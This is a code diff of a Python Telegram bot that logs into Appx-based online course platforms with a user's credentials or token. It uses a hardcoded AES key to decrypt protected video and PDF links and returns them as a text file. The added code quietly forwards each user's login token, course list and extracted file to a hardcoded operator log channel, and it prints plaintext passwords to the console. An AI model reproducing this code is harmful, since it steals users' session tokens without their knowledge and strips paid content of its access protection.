@@ -1,197 +1,223 @@
-import json
-import os
 import requests
-import threading
-import asyncio
-from pyrogram import filters
-from pyrogram.types import Message
+import json
 import cloudscraper
+from pyrogram import filters
+from Extractor import app
+import os
+import asyncio
+import aiohttp
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 from base64 import b64decode
-import config
-from Extractor import app
+from bs4 import BeautifulSoup
+log_channel = (-1002363250260)
 
-def decrypt_data(encoded_data):
-    key = "638udh3829162018".encode("utf8")
-    iv = "fedcba9876543210".encode("utf8")
-    decoded_data = b64decode(encoded_data)
+def decrypt(enc):
+    enc = b64decode(enc.split(':')[0])
+    key = '638udh3829162018'.encode('utf-8')
+    iv = 'fedcba9876543210'.encode('utf-8')
+    if len(enc) == 0:
+        return ""
     cipher = AES.new(key, AES.MODE_CBC, iv)
-    decrypted_data = unpad(cipher.decrypt(decoded_data), AES.block_size)
-    return decrypted_data.decode('utf-8')
+    plaintext = unpad(cipher.decrypt(enc), AES.block_size)
+    return plaintext.decode('utf-8')
 
-async def appex_down(app, message, hdr1, api, raw_text2, fuk, batch_name, name, prog):
-    vt = ""
+async def fetch(session, url, headers):
     try:
-        xx = fuk.split('&')
-        for v in range(len(xx)):
-            f = xx[v]
-            res3 = requests.get(f"https://{api}/get/alltopicfrmlivecourseclass?courseid=" + raw_text2 + "&subjectid=" + f, headers=hdr1)
-            b_data2 = res3.json().get('data', [])
-            vp = ""
-            for data in b_data2:
-                tid = data.get("topicid")
-                if tid:
-                    vp += f"{tid}&"
-
-            vj = ""
-            try:
-                xv = vp.split('&')
-                for y in range(len(xv)):
-                    t = xv[y]
-                    res4 = requests.get(f"https://{api}/get/livecourseclassbycoursesubtopconceptapiv3?topicid=" + t + "&start=-1&courseid=" + raw_text2 + "&subjectid=" + f, headers=hdr1).json()
-                    topicid = res4.get("data", [])
-                    for data in topicid:
-                        type = data.get('material_type')
-                        tid = data.get("Title")
-                        if type == 'VIDEO':
-                            if data.get('pdf_link'):
-                                plink = data.get('pdf_link').split(':')
-                                if len(plink) == 2:
-                                    encoded_part, encrypted_part = plink
-                                    bp = decrypt_data(encoded_part)
-                                    vs = f"{bp}"
-                                else:
-                                    print(f"Unexpected format: {plink}\n{tid}")
-
-                            if data.get('ytFlag') == 0 and data.get('ytFlagWeb') == 0:
-                                dlink = next((link['path'] for link in data.get('download_links', []) if link.get('quality') == "720p"), None)
-                                if dlink:
-                                    parts = dlink.split(':')
-                                    if len(parts) == 2:   
-                                        encoded_part, encrypted_part = parts
-                                        b = decrypt_data(encoded_part)
-                                        cool2 = f"{b}"
-                                    else:
-                                        print(f"Unexpected format: {dlink}\n{tid}")
-
-                            elif data.get('ytFlag') == 1 and data.get('ytFlagWeb') == 0:
-                                dlink = data.get('file_link')
-                                if dlink:
-                                    encoded_part, encrypted_part = dlink.split(':')
-                                    b = decrypt_data(encoded_part)
-                                    video_id = b.split('/')[-1]
-                                    cool2 = f"https://youtu.be/{video_id}"
-                                else:
-                                    print(f"Missing video_id for {tid}")
-
-                            elif data.get('ytFlag') == 1 and data.get('ytFlagWeb') == 1:
-                                dlink = data.get('file_link')
-                                if dlink:
-                                    encoded_part, encrypted_part = dlink.split(':')
-                                    b = decrypt_data(encoded_part)
-                                    cool2 = f"https://youtu.be/{b}"
-                                else:
-                                    print(f"Missing video_id for {tid}")
-                            else:
-                                print("Unknown ytFlag value")
-                            msg = f"{tid} : {cool2}\n{tid} : {vs}\n"
-                            vj += msg
-
-                        elif type == 'PDF':
-                            plink = data.get("pdf_link", "").split(':')
-                            if len(plink) == 2:
-                                encoded_part, encrypted_part = plink
-                                bp = decrypt_data(encoded_part)
-                                vs = f"{bp}"
-                                msg = f"{tid} : {vs}\n"
-                                vj += msg
-            except Exception as e:
-                print(str(e))  
-  
-            vt += vj
-
-        mm = batch_name
-        cap = f"**App Name :- {name}\nBatch Name :-** `{batch_name}`"
-        with open(f'{mm}.txt', 'a') as f:
-            f.write(f"{vt}")
-        await app.send_document(message.chat.id, document=f"{mm}.txt", caption=cap)
-        await prog.delete()
-        file_path = f"{mm}.txt"
-        os.remove(file_path)
-        await message.reply_text("Done")
+        async with session.get(url, headers=headers) as response:
+            if response.status != 200:
+                print(f"Error fetching {url}: {response.status}")
+                return {}
+            content = await response.text()
+            # Parse and clean HTML if needed
+            soup = BeautifulSoup(content, 'html.parser')
+            return json.loads(str(soup))
     except Exception as e:
-        print(str(e))
-        await message.reply_text("An error occurred. Please try again later.")
+        print(f"An error occurred while fetching {url}: {str(e)}")
+        return {}
 
-
-
+async def handle_course(session, api_base, bi, si, ti, hdr1, f):
+    url = f"{api_base}/get/livecourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
+    r3 = await fetch(session, url, hdr1)
+    for i in r3.get("data", []):
+        vi = i.get("id")
+        vn = i.get("Title")
+        r4 = await fetch(session, f"{api_base}/get/fetchVideoDetailsById?course_id={bi}&video_id={vi}&ytflag=0&folder_wise_course=0", hdr1)
+        vt = r4.get("data", {}).get("Title", "")
+        vl = r4.get("data", {}).get("download_link", "")
+        
+        if vl:
+            dvl = decrypt(vl)
+            print(f"{vt}:{dvl}")
+            f.write(f"{vt}:{dvl}\n")
+        else:
+            encrypted_links = r4.get("data", {}).get("encrypted_links", [])
+            for link in encrypted_links:
+                a = link.get("path")
+                if a:
+                    da = decrypt(a)
+                    print(f"{vt}:{da}")
+                    f.write(f"{vt}:{da}\n")
+                    break
+        
+        if "material_type" in r4.get("data", {}):
+            mt = r4["data"]["material_type"]
+            if mt == "VIDEO":
+                p1 = r4["data"].get("pdf_link", "")
+                p2 = r4["data"].get("pdf_link2", "")
+                if p1:
+                    dp1 = decrypt(p1)
+                    print(f"{vt}:{dp1}")
+                    f.write(f"{vt}:{dp1}\n")
+                if p2:
+                    dp2 = decrypt(p2)
+                    print(f"{vt}:{dp2}")
+                    f.write(f"{vt}:{dp2}\n")
 
 async def appex_v3_txt(app, message, api, name):
-    global cancel
-    cancel = False
-    raw_url = f"https://{api}/post/userLogin"
-    hdr = {
-        "Auth-Key": "appxapi",
-        "User-Id": "-2",
-        "Authorization": "",
-        "User_app_category": "",
-        "Language": "en",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Accept-Encoding": "gzip, deflate",
-        "User-Agent": "okhttp/4.9.1"
-    }
-    info = {"email": "", "password": ""}
-    input1 = await app.ask(message.chat.id, text="Send **ID & Password** in this manner, otherwise, the bot will not respond.\n\nSend like this: **ID*Password**")
-    raw_text = input1.text
-    info["email"] = raw_text.split("*")[0]
-    info["password"] = raw_text.split("*")[1]
-    await input1.delete(True)
-    scraper = cloudscraper.create_scraper()
-    res = scraper.post(raw_url, data=info, headers=hdr).content
-    output = json.loads(res)
-    userid = output["data"]["userid"]
-    token = output["data"]["token"]
-    hdr1 = {
-        "Host": api,
-        "Client-Service": "Appx",
-        "Auth-Key": "appxapi",
-        "User-Id": userid,
-        "Authorization": token
-    }
-    await message.reply_text("**login Successful**")
-    res1 = requests.get(f"https://{api}/get/mycourseweb?userid=" + userid, headers=hdr1)
-    b_data = res1.json()['data']
-    cool = ""
-
-    # Initialize FFF before the loop
-    FFF = "BATCH-ID - BATCH NAME - INSTRUCTOR\n\n"  # Default value or header
-
-    for data in b_data:
-        t_name = data['course_name']
-        aa = f"**`{data['id']}`      - `{data['course_name']}`**\n\n"
-        if len(f'{cool}{aa}') > 4096:
-            print(aa)
-            cool = ""
-        cool += aa
-
-    # Now FFF will always have a value
-    await message.reply_text(f"**YOU HAVE THESE BATCHES:**\n\n{FFF}\n\n{cool}")
+    api_base = api if api.startswith(("http://", "https://")) else f"https://{api}"
     
-    input2 = await app.ask(message.chat.id, text="**Now send the Batch ID to Download**")
+    editable11 = await app.send_message(message.chat.id, "Send Id*password or Token")
+    input1 = await app.listen(editable11.chat.id)
+    raw_text = input1.text
+    await input1.delete(True)
+    await editable11.delete(True)
+    
+    if '*' in raw_text:
+
+        raw_url = f"{api_base}/post/userLogin"
+        hdr = {
+            "Auth-Key": "appxapi",
+            "User-Id": "-2",
+            "Authorization": "",
+            "User_app_category": "",
+            "Language": "en",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Accept-Encoding": "gzip, deflate",
+            "User-Agent": "okhttp/4.9.1"
+        }
+        info = {"email": raw_text.split("*")[0], "password": raw_text.split("*")[1]}
+        print(info)
+        
+        try:
+            response = requests.post(raw_url, data=info, headers=hdr).json()
+            userid = response["data"]["userid"]
+            token = response["data"]["token"]
+        except Exception as e:
+            print(f"An error occurred: {str(e)}")
+            return await message.reply_text("Please try again later. Maybe Password Wrong")
+
+        hdr1 = {
+            "Client-Service": "Appx",
+            "source": "website",
+            "Auth-Key": "appxapi",
+            "Authorization": token,
+            "User-ID": userid
+        }
+        await message.reply_text("**Login Successful✅**")
+    else:
+        # Login using token
+        token = raw_text
+        hdr1 = {
+            "Client-Service": "Appx",
+            "source": "website",
+            "Auth-Key": "appxapi",
+            "Authorization": token,
+            "User-ID": ""
+        }
+        await message.reply_text("**Login with Token Successful✅**")
+    
+    try:
+        mc1 = requests.get(f"{api_base}/get/get_all_purchases?userid={hdr1['User-ID']}&item_type=10", headers=hdr1).json()
+    except json.JSONDecodeError as e:
+        print(f"JSON decode error: {str(e)}")
+        return await message.reply_text("Error decoding response from server. Please try again later.")
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+        return await message.reply_text("An error occurred while fetching your courses. Please try again later.")
+    
+    FFF = "𝗕𝗔𝗧𝗖𝗛 𝗜𝗗 ➤ 𝗕𝗔𝗧𝗖𝗛 𝗡𝗔𝗠𝗘\n\n"
+    
+    if "data" in mc1 and mc1["data"]:
+        for i in mc1["data"]:
+            for ct in i["coursedt"]:
+                ci = ct.get("id")
+                cn = ct.get("course_name")
+                FFF += f"**`{ci}`   -   `{cn}`**\n\n"
+    else:
+        try:
+            mc2 = requests.get(f"{api_base}/get/mycourseweb?userid={hdr1['User-ID']}", headers=hdr1).json()
+            if "data" in mc2 and mc2["data"]:
+                for i in mc2["data"]:
+                    ci = i.get("id")
+                    cn = i.get("course_name")
+                    FFF += f"**`{ci}`   -   `{cn}`**\n\n"
+            else:
+                await message.reply_text("No course found in ID")
+                return
+        except json.JSONDecodeError as e:
+            print(f"JSON decode error: {str(e)}")
+            return await message.reply_text("Error decoding response from server. Please try again later.")
+        except Exception as e:
+            print(f"An error occurred: {str(e)}")
+            return await message.reply_text("An error occurred while fetching your courses. Please try again later.")
+
+
+    dl=(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {api_base}\n\n`{token}`\n{FFF}")
+    editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅\n\n`{token}`\n{FFF}")
+    editable2 = await app.send_message(message.chat.id, "**Now send the Course ID to Download**")
+    input2 = await app.listen(editable2.chat.id)
     raw_text2 = input2.text
-    batch_name = None  # Initialize batch_name to None
+    await app.send_message(log_channel, dl)
+    await editable1.delete(True)
+    await editable2.delete(True)
+    await input2.delete(True)
+    await message.reply_text("EXTRACTING YOUR LINKS PLEASE WAIT.")
+    try:
+        r = requests.get(f"{api_base}/get/course_by_id?id={raw_text2}", headers=hdr1).json()
+    except json.JSONDecodeError as e:
+        print(f"JSON decode error: {str(e)}")
+        return await message.reply_text("Error decoding response from server. Please try again later.")
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+        return await message.reply_text("An error occurred while fetching the course details. Please try again later.")
 
-    for data in b_data:
-        if data['id'] == raw_text2:
-            batch_name = data['course_name']
+    for i in r.get("data", []):
+        txtn = i.get("course_name")
+        filename = f"{raw_text2}_{txtn.replace(':', '_').replace('/', '_')}.txt"
 
-    # Check if batch_name was found
-    if batch_name is None:
-        await message.reply_text("**Batch ID not found!**")
-        return
+        if '/' in filename:
+            filename1 = filename.replace("/", "").replace(" ", "_")
+        else:
+            filename1 = filename
 
-    scraper = cloudscraper.create_scraper()
-    html = scraper.get(f"https://{api}/get/allsubjectfrmlivecourseclass?courseid={raw_text2}", headers=hdr1).content
-    output0 = json.loads(html)
-    subjID = output0["data"]
-    cool = ""
-    fuk = ""
-
-    for sub in subjID:
-        subjid = sub["subjectid"]
-        fuk += f"{subjid}&"
-
-    prog = await message.reply_text("**Extracting Videos Links Please Wait  📥 **")
-    thread = threading.Thread(target=lambda: asyncio.run(appex_down(app, message, hdr1, api, raw_text2, fuk, batch_name, name, prog)))
-    thread.start()
+        async with aiohttp.ClientSession() as session:
+            with open(filename1, 'w') as f:
+                try:
+                    r1 = await fetch(session, f"{api_base}/get/allsubjectfrmlivecourseclass?courseid={raw_text2}&start=-1", hdr1)
+                    tasks = []
+                    for i in r1.get("data", []):
+                        si = i.get("subjectid")
+                        sn = i.get("subject_name")
+                        r2 = await fetch(session, f"{api_base}/get/alltopicfrmlivecourseclass?courseid={raw_text2}&subjectid={si}&start=-1", hdr1)
+                        for i in r2.get("data", []):
+                            ti = i.get("topicid")
+                            tn = i.get("topic_name")
+                            tasks.append(handle_course(session, api_base, raw_text2, si, ti, hdr1, f))
+                    await asyncio.gather(*tasks)
+                except Exception as e:
+                    print(f"An error occurred while processing the course: {str(e)}")
+                    return await message.reply_text("An error occurred while processing the course. Please try again later.")
+        
+        np=filename1
+        try:
+            await app.send_document(message.chat.id, filename1)
+            
+            await app.send_document(log_channel, np)
+        except Exception as e:
+            print(f"An error occurred while sending the document: {str(e)}")
+            await message.reply_text("An error occurred while sending the document. Please try again later.")
+        finally:
+            if os.path.exists(filename1):
+                os.remove(filename1)
+                
